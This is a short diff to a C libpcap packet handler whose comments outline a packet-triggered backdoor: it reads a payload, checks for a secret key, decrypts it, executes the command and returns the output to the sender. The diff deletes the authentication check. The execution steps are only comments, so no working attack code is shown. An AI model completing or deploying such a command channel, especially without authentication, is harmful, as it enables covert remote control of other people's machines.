@@ -26,6 +26,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     char command[MAX_COMMAND_LEN];
     int len;
     int loop;
+    
     char* payload;
 
     // Step 1: Locate the payload of the packet
@@ -34,11 +35,8 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     {
         return;
     }
+
     // Step 2: Check the payload for the secret key
-    if (!is_packet_authenticated(packet, header->len)) 
-    {
-        return;
-    }
 
     // Step 3: Decrypt the payload
 
@@ -49,5 +47,6 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     // Step 6: Execute the command
 
     // Step 7: Send the command's output to the sender of the command
+    
     return;
 }
